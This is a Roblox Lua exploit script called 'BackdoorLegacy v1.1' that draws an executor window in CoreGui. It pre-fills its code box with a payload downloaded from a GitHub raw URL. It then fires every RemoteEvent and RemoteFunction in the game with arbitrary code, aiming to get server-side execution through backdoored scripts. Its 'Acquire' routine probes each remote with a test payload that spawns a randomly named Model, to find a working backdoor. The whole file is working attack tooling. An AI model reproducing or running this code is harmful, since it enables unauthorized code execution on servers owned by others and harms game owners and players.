-- Import from URL feature coming soon!

print("Backdoor Legacy // Successfully booted up!")
local function debug(msg)
	if 0 == 1 then 
	game:GetService('TestService'):Message('BackdoorLegacy // '..tostring(msg)) -- This is for debugging. 
	end 
end 

-- Create GUI Objects

local ScrnGui = Instance.new("ScreenGui")
local MnPrt = Instance.new("Frame")
local InPrt = Instance.new("Frame")
local Cody = Instance.new("TextBox")
local Execy = Instance.new("TextButton")
local Acqur = Instance.new("TextButton")
local Labely = Instance.new("TextLabel")

-- Set Properties

ScrnGui.Name = "BackdoorLegacy"
ScrnGui.Parent = game:GetService('CoreGui')
ScrnGui.ResetOnSpawn = false

MnPrt.Active = true
MnPrt.BackgroundColor3 = Color3.new(0,0,0)
MnPrt.BorderColor3 = Color3.new(1,0,0)
MnPrt.Name = "MainPart"
MnPrt.Parent = ScrnGui
MnPrt.Position = UDim2.new(.5,-180,.5,-120)
MnPrt.Size = UDim2.new(0,360,0,240)
MnPrt.Draggable = true

InPrt.Active = true
InPrt.BackgroundColor3 = Color3.new(0,0,0)
InPrt.BorderColor3 = Color3.new(1,0,0)
InPrt.Name = "Inside"
InPrt.Parent = MnPrt
InPrt.Position = UDim2.new(0,0,0,50)
InPrt.Size = UDim2.new(0,360,0,190)
InPrt.Draggable = false

Cody.Active = true
Cody.BackgroundColor3 = Color3.new(0,0,0)
Cody.BorderColor3 = Color3.new(1,0,0)
Cody.ClearTextOnFocus = false
Cody.MultiLine = true
Cody.Name = "Code"
Cody.Parent = InPrt
Cody.Position = UDim2.new(0,5,0,5)
Cody.Size = UDim2.new(0,350,0,140)
Cody.Font = Enum.Font.Legacy
Cody.FontSize = Enum.FontSize.Size8
Cody.Text = game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua')
Cody.TextColor3 = Color3.new(1,0,0)
Cody.TextWrapped = true
Cody.TextXAlignment = Enum.TextXAlignment.Left
Cody.TextYAlignment = Enum.TextYAlignment.Top

Execy.Active = true
Execy.BackgroundColor3 = Color3.new(0,0,0)
Execy.BorderColor3 = Color3.new(1,0,0)
Execy.Name = "Execute"
Execy.Parent = InPrt
Execy.Position = UDim2.new(0,5,0,150)
Execy.Size = UDim2.new(0,170,0,35)
Execy.Font = Enum.Font.Legacy
Execy.FontSize = Enum.FontSize.Size14
Execy.Text = 'Execute!'
Execy.TextColor3 = Color3.new(1,0,0)

Acqur.Active = true
Acqur.BackgroundColor3 = Color3.new(0,0,0)
Acqur.BorderColor3 = Color3.new(1,0,0)
Acqur.Name = "Acquire"
Acqur.Parent = InPrt
Acqur.Position = UDim2.new(0,185,0,150)
Acqur.Size = UDim2.new(0,170,0,35)
Acqur.Font = Enum.Font.Legacy
Acqur.FontSize = Enum.FontSize.Size14
Acqur.Text = 'Acquire!'
Acqur.TextColor3 = Color3.new(1,0,0)

Labely.Active = true
Labely.BackgroundColor3 = Color3.new(0,0,0)
Labely.BorderColor3 = Color3.new(1,0,0)
Labely.Name = "Title"
Labely.Parent = MnPrt
Labely.Position = UDim2.new(0,180,0,25)
Labely.Size = UDim2.new(0,0,0,0)
Labely.Font = Enum.Font.Legacy
Labely.FontSize = Enum.FontSize.Size14
Labely.Text = 'BackdoorLegacy v1.1'
Labely.TextColor3 = Color3.new(1,0,0)

-- Add functionalities!

local AcquiredRemote = nil 
local IsAcquiring = false 

Execy.MouseButton1Click:Connect(function()
	-- Fetch code from TextBox.
	local CodeStr = Cody.Text
	local InvokeFunc = Instance.new("BindableEvent")
	InvokeFunc.Event:Connect(function(rfunc,codestr2)
		-- This invokes the RemoteFunction without waiting.
		rfunc:InvokeServer(codestr2)
	end)
	local function DeepFire(inst)
		if not IsAcquiring then 
		if AcquiredRemote == nil then 
		-- Search every descendant of DataModel.
		for _, childy in inst:GetChildren() do
			-- We don't want remotes from RobloxReplicatedStorage!
			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
				-- Check the class of the descendant.
				if childy:IsA("RemoteEvent") then
					-- If it is a RemoteEvent, fire it with code!
					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
					childy:FireServer(CodeStr)
				elseif childy:IsA("RemoteFunction") then
					-- Else if it is a RemoteFunction, invoke it with code!
					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
					InvokeFunc:Fire(childy, CodeStr)
				end
			end
				-- Keep looping through descendants, until dead end.
			DeepFire(childy)
		end 
		else 
		if AcquiredRemote:IsA("RemoteEvent") then 
			AcquiredRemote:FireServer(CodeStr) 
		elseif AcquiredRemote:IsA("RemoteFunction") then 
			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
		end
		end 
		end
	end
	-- Call the function!
	warn("Backdoor Legacy // Running all remotes with code:\n"..CodeStr)
	DeepFire(game)
end)

-- While making this acquire feature, my brain almost exploded.

Acqur.MouseButton1Click:Connect(function() 
	local RemoteList = {} 
	local CurrentRemote = nil 
	local isFound = false
	if not isAcquiring then 
		isAcquiring = true 
		warn('BackdoorLegacy // Scanning Started!') 
		Cody.Text = '-- Please wait, while we are scanning the remotes.'
		for i,v in pairs(game:GetDescendants()) do 
			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
					table.insert(RemoteList,v) 
				end 
			end
		end 
		for a,b in pairs(RemoteList) do
			if AcquiredRemote == nil and not b.Name:find("FE") then 
				print("BackdoorLegacy // Checking "..b.ClassName..' "'..b:GetFullName()..'".') 
				--wait(1)
				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
				CurrentRemote = b 
				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
					if b:IsA('RemoteEvent') then 
						debug('Fired')
						b:FireServer(NeededCode) 
					elseif b:IsA('RemoteFunction') then 
						debug('Invoked')
						task.spawn(function() b:InvokeServer(NeededCode) end) 
					end 
				end 
				debug('Awaiting')
				if workspace:FindFirstChild(NeededNameOfModel) then 
					debug('Detected')
					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
						debug('Success')
						AcquiredRemote = b
					end 
				end 
			end 
		end 	
		if AcquiredRemote ~= nil then 
			isFound = true 
			Cody.Text = '-- Remote acquired! :D' 
			warn('BackdoorLegacy // Remote acquired! :D')
		else 
			isFound = false 
			Cody.Text = '-- Not found. :(' 
			warn('BackdoorLegacy // Not found. :(')
		end 
		isAcquiring = false 
	end 
end)

-- That's the end of the code!
